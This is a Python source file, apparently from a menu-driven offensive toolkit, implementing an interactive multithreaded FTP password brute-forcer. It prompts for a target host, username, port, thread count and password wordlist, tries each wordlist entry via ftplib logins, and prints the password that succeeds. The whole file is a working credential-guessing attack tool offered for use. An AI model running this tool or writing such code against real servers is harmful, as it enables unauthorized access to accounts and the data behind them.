#!/usr/bin/python3

from assets.banners import bruteftp_banner
from assets.colors import *
from assets.designs import logo, author
from assets.prefixes import invalid_input_prefix, eagleshell_prefix, rhost_prefix, wordlist_prefix, unable_to_connect_prefix, user_prefix, rport_prefix, threads_prefix
from assets.properties import clear_screen
from assets.shortcuts import Exit
from .brute_force import BruteForce
import os
import queue
import ftplib
from threading import Thread


class BruteFTP:
    def __init__(self):
        self.host_set = ''
        self.user_set = ''
        self.rport_set = ''
        self.n_threads = 10
        self.password_found = ''
        self.password_tried = 0
        self.q = queue.Queue()
        self.configuration()
        self.brute_forcing()
        self.result()

    def header(self):
        os.system(clear_screen)
        print(logo)
        print(bruteftp_banner)
        print(author)

    def configuration(self):
        try:
            self.header()
            print('Configuration:')
            print('\n\tRHOST Input')
            print('\tExample: 10.10.10.15\n')
            print('\n\tUser Input:')
            print('\tExample: admin\n')
            print('\n\tRPORT Input')
            print('\tExample: 21\n')
            print('\n\tThreads Input')
            print('\tExample: 10\n')
            print('\n\tWordlist Input')
            print('\tExample: /usr/share/wordlists/mypasswords.txt')
            print('\n\tZ): Back')
            print('\tX): Exit\n')
            os.system('sleep 0.01')
            while True:
                self.host_set = input(rhost_prefix).lower()
                if self.host_set == 'z':
                    BruteForce()
                elif self.host_set == 'x':
                    Exit()
                self.user_set = input(user_prefix)
                if self.user_set == 'z' or self.user_set == 'Z':
                    BruteForce()
                elif self.user_set == 'x' or self.user_set == 'X':
                    Exit()
                self.rport_set = input(rport_prefix).lower()
                if self.rport_set == 'z':
                    BruteForce()
                elif self.rport_set == 'x':
                    Exit()
                self.threads_set = input(threads_prefix).lower()
                self.n_threads = self.threads_set
                if self.threads_set == 'z':
                    BruteForce()
                elif self.threads_set == 'x':
                    Exit()
                self.wordlist_set = input(wordlist_prefix)
                if self.wordlist_set == 'z' or self.wordlist_set == 'Z':
                    BruteForce()
                elif self.wordlist_set == 'x' or self.wordlist_set == 'X':
                    Exit()
                break
        except ValueError:
            print('\t' + unable_to_connect_prefix)
            os.system('sleep 1')
            BruteFTP()
        except FileNotFoundError:
            print('\t' + unable_to_connect_prefix)
            os.system('sleep 1')
            BruteFTP()
        except KeyboardInterrupt:
            Exit()

    def brute_forcing(self):
        try:
            self.header()
            print('Process:')
            print('\n\tStatus')
            print('\t------')
            print('\n\tStop: CTRL+C\n')
            passwords = open(self.wordlist_set).read().split("\n")
            for password in passwords:
                self.q.put(password)
            for t in range(int(self.n_threads)):
                thread = Thread(target=self.connect_ftp)
                thread.daemon = True
                thread.start()
            self.q.join()
        except KeyboardInterrupt:
            self.safe_result()
        else:
            pass

    def connect_ftp(self):
        try:
            while True:
                password = self.q.get()
                server = ftplib.FTP()
                self.password_tried = self.password_tried + 1
                print('\tPASSWORDS TRIED: ' + str(self.password_tried), end='\r')
                try:
                    server.connect(self.host_set, int(self.rport_set), timeout=5)
                    server.login(self.user_set, password)
                except ftplib.error_perm:
                    pass
                else:
                    self.password_found = password
                    with self.q.mutex:
                        self.q.queue.clear()
                        self.q.all_tasks_done.notify_all()
                        self.q.unfinished_tasks = 0
                    self.result()
        except KeyboardInterrupt:
            self.safe_result()

    def safe_result(self):
        os.system(clear_screen)
        with self.q.mutex:
            self.q.queue.clear()
            self.q.all_tasks_done.notify_all()
            self.q.unfinished_tasks = 0
        self.result()

    def result(self):
        try:
            self.header()
            print('Result:\n')
            if len(self.password_found) > 1:
                print(WHITE + '\tPASSWORD: ' + GREEN + self.password_found + WHITE)
            else:
                print(WHITE + '\tPASSWORD: ' + RED + 'Not Found.\n' + WHITE)
            if len(self.password_found) > 1:
                print('\tPASSWORDS TRIED: ' + GREEN + str(self.password_tried) + WHITE)
            else:
                print('\tPASSWORDS TRIED: ' + RED + str(self.password_tried) + WHITE)
            print('\n\tY): New')
            print('\tZ): Menu')
            print('\tX): Exit\n')
            os.system('sleep 0.01')
            while True:
                cmd = input(eagleshell_prefix).lower()
                if cmd == 'y':
                    BruteFTP()
                elif cmd == 'z':
                    BruteForce()
                elif cmd == 'x':
                    Exit()
                else:
                    print(invalid_input_prefix)
                    continue
        except KeyboardInterrupt:
            Exit()
